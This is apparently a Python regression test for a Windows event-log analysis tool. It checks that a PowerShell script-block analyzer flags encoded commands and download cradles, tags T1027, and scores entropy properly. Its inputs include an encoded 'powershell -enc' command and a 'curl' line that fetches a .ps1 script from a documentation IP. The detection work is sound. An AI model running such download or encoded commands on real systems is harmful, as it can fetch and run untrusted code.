"""Script-block content flags agree with the safety-net patterns, and entropy means entropy.

Gemini audit 9-14 (Low), content_analysis.analyze_script_block:
1. "-enc " and "curl " are safety-net patterns, but did not set the
   encoded-command / download-cradle flags (separate keyword lists);
2. encoded commands mapped to T1059.001 (already always tagged), not T1027;
3. "high entropy" was any 60-character base64-like run, so "A" * 65
   (0 bits/char) counted.

Expected: those flags set, T1027 tagged, "A" * 65 not high entropy while
real base64 is.  Synthetic text.
"""
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def main() -> int:
    from evtx_tool.analysis.ps_extractor.content_analysis import analyze_script_block as a
    real = base64.b64encode("Get-Process | Where-Object { $_.CPU -gt 100 } | Stop-Process -Force".encode("utf-16-le")).decode()
    cases = [
        ("'-enc ' sets the encoded-command flag", a("powershell -enc ZQBjAGgAbwA=").has_encoded_commands),
        ("...tagged T1027", "T1027" in a("powershell -enc ZQBjAGgAbwA=").att_ck_techniques),
        ("'curl ' sets the download-cradle flag", a("curl http://192.0.2.1/x.ps1 -o x.ps1").has_download_cradle),
        ("'A' * 65 is not high entropy", not a("$x = '" + "A" * 65 + "'").has_high_entropy_strings),
        ("real base64 is high entropy", a("$x = '" + real + "'").has_high_entropy_strings),
        ("plain text sets none of them", not any((lambda r: (r.has_encoded_commands, r.has_download_cradle,
                                                             r.has_high_entropy_strings))(a("Get-ChildItem C:\\")))),
    ]
    ok = 0
    for name, good in cases:
        ok += bool(good)
        print(f"  {'PASS' if good else 'FAIL'}  {name}")
    print(f"{ok}/{len(cases)} checks passed")
    return 0 if ok == len(cases) else 1


if __name__ == "__main__":
    sys.exit(main())
